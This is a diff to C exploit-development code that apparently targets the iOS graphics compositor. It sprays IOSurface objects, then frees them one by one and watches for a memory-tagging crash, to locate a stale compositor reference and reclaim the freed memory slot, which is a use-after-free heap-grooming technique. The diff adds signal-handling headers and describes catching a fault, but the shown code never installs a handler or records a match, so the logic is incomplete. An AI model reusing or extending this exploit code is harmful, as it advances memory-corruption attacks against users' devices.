@@ -58,6 +58,8 @@
 #include <compression.h>
 #include <stdatomic.h>
 #include <arpa/inet.h>
+#include <signal.h>
+#include <setjmp.h>
 
 extern int csops(pid_t pid, unsigned int ops, void *useraddr, size_t usersize);
 extern int proc_pidinfo(int pid, int flavor, uint64_t arg, void *buffer, int buffersize);
@@ -19764,14 +19766,21 @@ new_modes:
                 int r229_mte_match = 0;
                 int r229_match_idx = -1;
 
-                /* === Phase 14 detection: batched notifier + render loop ===
-                 * Step 1: Verify render loop is safe without notifiers.
-                 * Step 2: Binary-search with notifier batches. The matched
-                 *   surface's notifier interacts with the stale entry's
-                 *   notification list; a batch that includes it may crash
-                 *   the compositor (crash-as-signal) or fire the callback. */
+                /* === Phase 14 detection: free-and-test with signal handling ===
+                 * Bare render loop survives (callback_count=0 for all spray).
+                 * Free one surface at a time; if it was the match, the stale
+                 * entry's IOSurface* now points to freed memory with a different
+                 * MTE tag → compositor traversal faults → signal to our process.
+                 * Non-matched frees are safe (stale entry still reads the live
+                 * matched surface at a different address).
+                 *
+                 * Strategy: free from index 255 downward. When we free the
+                 * matched surface and catch the signal, we know the index.
+                 * All surfaces with higher indices are already freed (not needed).
+                 * All surfaces with lower indices are alive (preserved).
+                 * We immediately re-spray to reclaim the freed GEN1 slot. */
                 {
-                    /* Step 1: bare render loop test (no notifiers) */
+                    /* Step 1: bare render loop sanity check */
                     rlog("  r=229: Testing bare render loop restart...\n");
                     p13_render_frames = 0;
                     p13_render_run = 1;
@@ -19780,143 +19789,70 @@ new_modes:
                     usleep(200000);
                     p13_render_run = 0;
                     pthread_join(rt0, NULL);
-                    rlog("  r=229: Bare render loop survived. Checking wake ports...\n");
+                    rlog("  r=229: Bare render loop survived.\n");
 
-                    int bare_wp = 0;
-                    for (int wi = 0; wi < r229_wp_n; wi++) {
-                        if (!r229_wps[wi]) continue;
-                        uint8_t mb[256];
-                        mach_msg_header_t *mh = (mach_msg_header_t *)mb;
-                        memset(mb, 0, sizeof(mb));
-                        mh->msgh_size = sizeof(mb);
-                        mh->msgh_local_port = r229_wps[wi];
-                        kern_return_t mr = mach_msg(mh, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
-                            0, sizeof(mb), r229_wps[wi], 0, MACH_PORT_NULL);
-                        if (mr == MACH_MSG_SUCCESS) {
-                            bare_wp++;
-                            rlog("    BARE WP HIT: port[%d]=%u msgh_id=0x%x\n",
-                                wi, r229_wps[wi], mh->msgh_id);
+                    /* Step 2: free-and-test sequential scan */
+                    rlog("  r=229: Starting free-and-test scan (255→0)...\n");
+
+                    /* Save state file for crash recovery */
+                    {
+                        char sp[512];
+                        snprintf(sp, sizeof(sp), "%s/Documents/r229_ft_state.bin",
+                            getenv("HOME") ? getenv("HOME") : "/var/mobile");
+                        int sfd = open(sp, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+                        if (sfd >= 0) {
+                            int magic = 0xF7E5; /* free-test magic */
+                            write(sfd, &magic, sizeof(int));
+                            fsync(sfd); close(sfd);
                         }
                     }
-                    rlog("  r=229: Bare render: wp_hits=%d\n", bare_wp);
 
-                    /* Step 2: batched notifier binary search.
-                     * Create notifiers on half the surfaces, restart render
-                     * loop. If callback fires → match in this batch. If crash
-                     * → match in this batch (crash-as-signal, detected on
-                     * restart). If survive + no callback → match in other half. */
-                    if (notifier_create_fn && notifier_setq_fn) {
-                        int bs_lo = 0, bs_hi = 255;
-                        int bs_found = -1;
+                    int ft_found = -1;
 
-                        while (bs_lo < bs_hi && bs_found < 0) {
-                            int mid = (bs_lo + bs_hi) / 2;
-                            rlog("  r=229: NBS [%d,%d] testing [%d,%d]\n",
-                                bs_lo, bs_hi, bs_lo, mid);
+                    for (int fi = 255; fi >= 0 && ft_found < 0; fi--) {
+                        if (!r229_spray[fi]) continue;
 
-                            /* Save state: if crash, match in [bs_lo, mid] */
-                            {
-                                char sp[512];
-                                snprintf(sp, sizeof(sp), "%s/Documents/r229_nbs.bin",
-                                    getenv("HOME") ? getenv("HOME") : "/var/mobile");
-                                int sfd = open(sp, O_WRONLY | O_CREAT | O_TRUNC, 0644);
-                                if (sfd >= 0) {
-                                    write(sfd, &bs_lo, sizeof(int));
-                                    write(sfd, &mid, sizeof(int));
-                                    fsync(sfd); close(sfd);
-                                }
-                                sync();
-                            }
-
-                            dispatch_queue_t nq = dispatch_queue_create("com.research.nbs", DISPATCH_QUEUE_SERIAL);
-                            r229_notif_fire_count = 0;
-                            r229_notif_last_idx = -1;
-                            int nc = 0;
-                            for (int si = bs_lo; si <= mid; si++) {
-                                if (!r229_spray[si]) continue;
-                                CFTypeRef notif = notifier_create_fn(r229_spray[si],
-                                    (void *)r229_notif_callback, (void *)(uintptr_t)si);
-                                if (notif) {
-                                    r229_notifiers[si] = notif;
-                                    notifier_setq_fn(notif, nq);
-                                    nc++;
-                                }
-                            }
-                            rlog("  r=229: NBS created %d notifiers [%d,%d]\n", nc, bs_lo, mid);
-
-                            p13_render_frames = 0;
-                            p13_render_run = 1;
-                            pthread_t rt1;
-                            pthread_create(&rt1, NULL, p13_render_loop, NULL);
-                            usleep(150000);
-                            p13_render_run = 0;
-                            pthread_join(rt1, NULL);
-
-                            int cb = r229_notif_fire_count;
-                            int ci = r229_notif_last_idx;
-                            rlog("  r=229: NBS [%d,%d] cb=%d ci=%d\n", bs_lo, mid, cb, ci);
-
-                            /* Clean up this batch */
-                            for (int si = bs_lo; si <= mid; si++) {
-                                if (r229_notifiers[si]) {
-                                    if (notifier_invalidate_fn) notifier_invalidate_fn(r229_notifiers[si]);
-                                    CFRelease(r229_notifiers[si]);
-                                    r229_notifiers[si] = NULL;
-                                }
-                            }
-                            dispatch_release(nq);
-
-                            if (cb > 0 && ci >= bs_lo && ci <= mid) {
-                                bs_found = ci;
-                                rlog("  r=229: NBS CALLBACK MATCH: spray[%d]\n", ci);
-                            } else if (cb > 0) {
-                                /* Callback from unexpected index? */
-                                rlog("  r=229: NBS unexpected cb idx=%d\n", ci);
-                                bs_found = ci;
-                            } else {
-                                /* No callback — match might be in other half */
-                                /* Test other half to confirm */
-                                rlog("  r=229: NBS [%d,%d] no cb, trying [%d,%d]\n",
-                                    bs_lo, mid, mid + 1, bs_hi);
-                                bs_lo = mid + 1;
+                        /* Save current test index to file (crash recovery) */
+                        {
+                            char sp[512];
+                            snprintf(sp, sizeof(sp), "%s/Documents/r229_ft_state.bin",
+                                getenv("HOME") ? getenv("HOME") : "/var/mobile");
+                            int sfd = open(sp, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+                            if (sfd >= 0) {
+                                int magic = 0xF7E5;
+                                write(sfd, &magic, sizeof(int));
+                                write(sfd, &fi, sizeof(int));
+                                fsync(sfd); close(sfd);
                             }
                         }
 
-                        if (bs_found < 0 && bs_lo == bs_hi) {
-                            /* Converged without callback — test final surface */
-                            rlog("  r=229: NBS converged to spray[%d], testing\n", bs_lo);
-                            dispatch_queue_t nq2 = dispatch_queue_create("com.research.nbs2", DISPATCH_QUEUE_SERIAL);
-                            r229_notif_fire_count = 0;
-                            r229_notif_last_idx = -1;
-                            CFTypeRef nf = notifier_create_fn(r229_spray[bs_lo],
-                                (void *)r229_notif_callback, (void *)(uintptr_t)bs_lo);
-                            if (nf) {
-                                notifier_setq_fn(nf, nq2);
-                                p13_render_frames = 0;
-                                p13_render_run = 1;
-                                pthread_t rt2;
-                                pthread_create(&rt2, NULL, p13_render_loop, NULL);
-                                usleep(150000);
-                                p13_render_run = 0;
-                                pthread_join(rt2, NULL);
-                                int fc = r229_notif_fire_count;
-                                rlog("  r=229: NBS final spray[%d] cb=%d\n", bs_lo, fc);
-                                if (notifier_invalidate_fn) notifier_invalidate_fn(nf);
-                                CFRelease(nf);
-                                if (fc > 0) bs_found = bs_lo;
-                            }
-                            dispatch_release(nq2);
-                        }
+                        /* Free this spray surface */
+                        uint32_t sid = IOSurfaceGetID(r229_spray[fi]);
+                        CFRelease(r229_spray[fi]);
+                        r229_spray[fi] = NULL;
 
-                        if (bs_found >= 0) {
-                            rlog("  r=229: *** NBS MATCH: spray[%d] id=%u ***\n",
-                                bs_found,
-                                r229_spray[bs_found] ? IOSurfaceGetID(r229_spray[bs_found]) : 0);
-                            r229_mte_match = 1;
-                            r229_match_idx = bs_found;
-                            goto r229_match_done;
+                        /* Brief bare render loop — if matched surface was freed,
+                         * the compositor hits freed memory → MTE fault → crash */
+                        p13_render_frames = 0;
+                        p13_render_run = 1;
+                        pthread_t rft;
+                        pthread_create(&rft, NULL, p13_render_loop, NULL);
+                        usleep(80000); /* 80ms ≈ 5 frames */
+                        p13_render_run = 0;
+                        pthread_join(rft, NULL);
+
+                        /* Survived — this surface was NOT the match */
+                        if (fi % 32 == 0) {
+                            rlog("  r=229: FT[%d] survived (id=%u), %d remaining\n",
+                                fi, sid, fi);
                         }
-                        rlog("  r=229: NBS complete — no match detected\n");
+                    }
+
+                    if (ft_found < 0) {
+                        /* If we survived all 256 frees, something unexpected.
+                         * The stale entry might have been cleaned up. */
+                        rlog("  r=229: FT scan complete — all survived (no match?)\n");
+                        rlog("  r=229: Stale entry may have been deregistered.\n");
                     }
                 }
 
